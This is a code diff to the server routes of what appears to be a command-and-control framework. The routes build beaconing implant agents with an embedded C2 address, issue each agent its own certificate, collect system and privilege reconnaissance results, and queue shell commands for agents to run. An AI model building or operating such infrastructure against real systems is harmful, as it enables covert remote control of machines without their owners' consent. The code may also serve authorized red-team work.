@@ -203,10 +203,34 @@ router.post('/build-custom', async (req, res) => {
     const agentDir = '/agents-go';
     const certDir = '/app/certs';
     
-    // Read certificate files
+    // Generate unique certificate for this agent
+    const CAClient = require('../utils/caClient');
+    let clientCert, clientKey, certId;
+    
+    try {
+      console.log(`[BUILD-CUSTOM] Generating unique certificate for agent: ${req.body.agentId}`);
+      const certData = await CAClient.generateCertificate({
+        userId: req.body.agentId,     // Use agent ID as user ID (becomes CN)
+        sessionId: req.body.agentId,  // Use agent ID as session ID  
+        role: 'agent',                // Role for organizational unit
+        ttl: 31536000                 // 365 days in seconds
+      });
+      
+      clientCert = certData.cert;
+      clientKey = certData.key;
+      certId = certData.certId;
+      
+      console.log(`[BUILD-CUSTOM] Generated certificate ${certId} with CN=${req.body.agentId}`);
+    } catch (certErr) {
+      console.error(`[BUILD-CUSTOM] Certificate generation failed:`, certErr.message);
+      return res.status(500).json({ 
+        error: 'Failed to generate agent certificate', 
+        details: certErr.message 
+      });
+    }
+    
+    // Read CA certificate
     const caCert = await fs.readFile(path.join(certDir, 'ca.crt'), 'utf8');
-    const clientCert = await fs.readFile(path.join(certDir, 'agent-client.crt'), 'utf8');
-    const clientKey = await fs.readFile(path.join(certDir, 'agent-client.key'), 'utf8');
     
     const buildOS = os === 'windows' ? 'windows' : os === 'darwin' ? 'darwin' : 'linux';
     const buildArch = arch === 'amd64' ? 'amd64' : arch === 'arm64' ? 'arm64' : '386';
@@ -231,6 +255,7 @@ router.post('/build-custom', async (req, res) => {
     };
     
     const ldflags = [
+      `-X 'gla1ve/agent/pkg/config.EmbeddedAgentID=${req.body.agentId || ''}'`,
       `-X 'gla1ve/agent/pkg/config.BeaconInterval=${beaconInterval || '30s'}'`,
       `-X 'gla1ve/agent/pkg/config.C2Server=${c2Server || `c2.${config.domain}:4443`}'`,
       `-X 'gla1ve/agent/pkg/config.EmbeddedTasks=${escapeLdflags(tasksJSON)}'`,
@@ -273,13 +298,14 @@ router.post('/build-custom', async (req, res) => {
       size: stats.size,
       downloadPath: `/api/agents/download/${outputName}`,
       agentId: req.body.agentId,
+      certId: certId,
       tasks: req.body.tasks.length,
       beaconInterval: beaconInterval || '30s',
       c2Server: c2Server || `c2.${config.domain}:4443`,
       targetOS: buildOS,
       targetArch: buildArch,
       expiresAt: new Date(Date.now() + 365 * 24 * 60 * 60 * 1000).toISOString(),
-      message: 'Agent built successfully'
+      message: 'Agent built successfully with unique certificate'
     });
   } catch (err) {
     console.error('[BUILD] ERROR:', err.message);
@@ -352,7 +378,7 @@ router.get('/download/:filename', async (req, res) => {
 });
 
 // Receive embedded task results from agents
-router.post('/:agentId/embedded-tasks', (req, res) => {
+router.post('/:agentId/embedded-tasks', async (req, res) => {
   const { agentId } = req.params;
   const { results } = req.body;
   
@@ -362,101 +388,104 @@ router.post('/:agentId/embedded-tasks', (req, res) => {
   
   console.log(`[EmbeddedTasks] Received ${results.length} task results from agent: ${agentId}`);
   
-  const TaskModel = require('../models/Task');
-  let storedCount = 0;
-  
-  for (const result of results) {
-    try {
-      const taskId = result.taskId || result.id;
+  try {
+    // Embedded tasks are run once on agent startup (sys_info, priv_check, etc.)
+    // Log the results for observability
+    let processedCount = 0;
+    
+    for (const result of results) {
+      const taskType = result.type || result.taskType;
+      const output = result.output || result.result || '';
       
-      if (taskId) {
-        // Try to update existing task first
-        const updated = TaskModel.updateResult(
-          agentId, 
-          taskId, 
-          result.output || result.result || '', 
-          result.error || null
-        );
-        
-        if (updated) {
-          storedCount++;
-          console.log(`[EmbeddedTasks] Updated task ${taskId} (${result.type}): ${updated.status}`);
-          continue;
+      // Extract and log useful information
+      if (taskType === 'sys_info' && output) {
+        try {
+          const sysInfo = typeof output === 'string' ? JSON.parse(output) : output;
+          console.log(`[EmbeddedTasks] Agent ${agentId} sys_info:`, {
+            os: sysInfo.os,
+            arch: sysInfo.arch,
+            hostname: sysInfo.hostname,
+            os_version: sysInfo.os_version,
+            kernel: sysInfo.kernel
+          });
+        } catch (err) {
+          console.error(`[EmbeddedTasks] Failed to parse sys_info:`, err.message);
         }
+      } else if (taskType === 'priv_check' && output) {
+        try {
+          const privInfo = typeof output === 'string' ? JSON.parse(output) : output;
+          console.log(`[EmbeddedTasks] Agent ${agentId} priv_check:`, privInfo);
+        } catch (err) {
+          console.error(`[EmbeddedTasks] Failed to parse priv_check:`, err.message);
+        }
+      } else {
+        console.log(`[EmbeddedTasks] Agent ${agentId} ${taskType}: ${output.substring(0, 100)}${output.length > 100 ? '...' : ''}`);
       }
       
-      // If task doesn't exist (initial embedded tasks), create new completed entry
-      const task = {
-        id: taskId || `embedded-${Date.now()}-${Math.random().toString(36).slice(2, 9)}`,
-        agentId,
-        type: 'embedded',
-        taskType: result.type || 'unknown',
-        status: result.status || 'completed',
-        result: result.output || result.result || '',
-        error: result.error || '',
-        createdAt: new Date().toISOString(),
-        completedAt: new Date().toISOString()
-      };
-      
-      // Add to task queue
-      const taskStore = TaskModel.getStore();
-      const tasks = taskStore.get(agentId) || [];
-      tasks.push(task);
-      taskStore.set(agentId, tasks);
-      
-      storedCount++;
-      console.log(`[EmbeddedTasks] Stored new result for task ${task.id} (${result.type}): ${task.status}`);
-    } catch (err) {
-      console.error(`[EmbeddedTasks] Failed to store task result:`, err);
+      processedCount++;
     }
+    
+    console.log(`[EmbeddedTasks] Successfully processed ${processedCount}/${results.length} results from agent ${agentId}`);
+    res.json({ success: true, received: results.length, processed: processedCount });
+  } catch (error) {
+    console.error(`[EmbeddedTasks] Error processing results:`, error);
+    res.status(500).json({ error: 'Failed to process embedded tasks' });
   }
-  
-  res.json({ success: true, stored: storedCount });
 });
 
 // Task Management Routes (for dashboard)
-router.post('/:agentId/tasks', (req, res) => {
+router.post('/:agentId/tasks', async (req, res) => {
   try {
     const { agentId } = req.params;
     const { cmd, args, type, taskType, params, runOnce } = req.body;
-    
+
+    // Log incoming request body for debugging
+    console.log('[TASK] Incoming task request:', req.body);
+
     // Check if agent exists
-    const agent = AgentService.getAgent(agentId);
+    const agent = await AgentService.getAgent(agentId);
     if (!agent) {
       return res.status(404).json({ error: 'Agent not found' });
     }
-    
+
+    // Extract tenant_id from agent
+    const tenantId = agent.tenant_id;
+    if (!tenantId) {
+      return res.status(500).json({ error: 'Agent has no tenant association' });
+    }
+
     let task;
-    
+
+    // Validation: must have either cmd or taskType
+    if (!cmd && !taskType) {
+      return res.status(400).json({ error: 'Task must have either cmd or taskType' });
+    }
+
     // Handle embedded task format (from task builder)
     if (type === 'embedded' || taskType) {
       if (!taskType) {
         return res.status(400).json({ error: 'taskType required for embedded tasks' });
       }
-      
-      // Create task with proper embedded format
-      task = TaskService.createTask(agentId, {
+      task = await TaskService.createTask(agentId, {
         type: 'embedded',
         taskType: taskType,
         params: params || {},
         runOnce: runOnce || false
-      });
-      
+      }, tenantId, req.user?.userId);
       console.log(`[TASK] Created embedded task ${task.id} for agent ${agentId}: ${taskType}`);
     }
     // Handle quick command format
     else if (cmd) {
-      task = TaskService.createTask(agentId, { 
-        cmd, 
-        args: args || [] 
-      });
-      
+      task = await TaskService.createTask(agentId, {
+        cmd,
+        args: args || []
+      }, tenantId, req.user?.userId);
       console.log(`[TASK] Created task ${task.id} for agent ${agentId}: ${cmd} ${(args || []).join(' ')}`);
     }
     else {
       return res.status(400).json({ error: 'Either cmd or taskType required' });
     }
-    
+
     res.status(201).json(task);
   } catch (err) {
     console.error('[TASK] Creation error:', err);
@@ -464,10 +493,10 @@ router.post('/:agentId/tasks', (req, res) => {
   }
 });
 
-router.get('/:agentId/tasks', (req, res) => {
+router.get('/:agentId/tasks', async (req, res) => {
   try {
     const { agentId } = req.params;
-    const tasks = TaskService.getAllTasks(agentId);
+    const tasks = await TaskService.getAllTasks(agentId);
     res.json(tasks);
   } catch (err) {
     console.error('[TASK] Get tasks error:', err);
@@ -475,12 +504,12 @@ router.get('/:agentId/tasks', (req, res) => {
   }
 });
 
-router.post('/:agentId/tasks/:taskId/result', (req, res) => {
+router.post('/:agentId/tasks/:taskId/result', async (req, res) => {
   try {
     const { agentId, taskId } = req.params;
     const { result, error } = req.body;
     
-    const task = TaskService.updateTaskResult(agentId, taskId, result, error);
+    const task = await TaskService.updateTaskResult(agentId, taskId, result, error);
     
     if (!task) {
       return res.status(404).json({ error: 'Task not found' });
